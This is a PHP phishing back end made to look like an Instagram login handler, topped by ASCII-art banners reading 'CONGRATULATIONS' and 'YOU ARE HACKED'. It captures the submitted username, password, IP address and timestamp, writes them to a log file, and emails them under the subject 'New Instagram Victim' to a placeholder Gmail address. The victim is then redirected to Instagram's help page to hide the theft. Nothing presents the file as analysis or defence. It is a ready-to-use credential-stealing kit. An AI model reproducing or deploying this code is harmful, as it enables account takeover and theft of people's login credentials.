<?php


 ######   #######  ##    ##  ######   ########     ###    ######## ##     ## ##          ###    ######## ####  #######  ##    ##  ######  
##    ## ##     ## ###   ## ##    ##  ##     ##   ## ##      ##    ##     ## ##         ## ##      ##     ##  ##     ## ###   ## ##    ## 
##       ##     ## ####  ## ##        ##     ##  ##   ##     ##    ##     ## ##        ##   ##     ##     ##  ##     ## ####  ## ##       
##       ##     ## ## ## ## ##   #### ########  ##     ##    ##    ##     ## ##       ##     ##    ##     ##  ##     ## ## ## ##  ######  
##       ##     ## ##  #### ##    ##  ##   ##   #########    ##    ##     ## ##       #########    ##     ##  ##     ## ##  ####       ## 
##    ## ##     ## ##   ### ##    ##  ##    ##  ##     ##    ##    ##     ## ##       ##     ##    ##     ##  ##     ## ##   ### ##    ## 
 ######   #######  ##    ##  ######   ##     ## ##     ##    ##     #######  ######## ##     ##    ##    ####  #######  ##    ##  ######  


// db    db  .d88b.  db    db     .d8b.  d8888b. d88888b    db   db  .d8b.   .o88b. db   dD d88888b d8888b. 
// `8b  d8' .8P  Y8. 88    88    d8' `8b 88  `8D 88'        88   88 d8' `8b d8P  Y8 88 ,8P' 88'     88  `8D 
//  `8bd8'  88    88 88    88    88ooo88 88oobY' 88ooooo    88ooo88 88ooo88 8P      88,8P   88ooooo 88   88 
//    88    88    88 88    88    88~~~88 88`8b   88~~~~~    88~~~88 88~~~88 8b      88`8b   88~~~~~ 88   88 
//    88    `8b  d8' 88b  d88    88   88 88 `88. 88.        88   88 88   88 Y8b  d8 88 `88. 88.     88  .8D 
//    YP     `Y88P'  ~Y8888P'    YP   YP 88   YD Y88888P    YP   YP YP   YP  `Y88P' YP   YD Y88888P Y8888D' 
                                                                                                   
   
#         By RISHU RIKSHT    
                                                                                                                   
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Instagram Login ==========\n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "YOUREMAILID@gmail.com";
$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";
$file = fopen("logs.txt","ab");
fwrite($file,$message);
fclose($file);
$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://help.instagram.com/");
?>
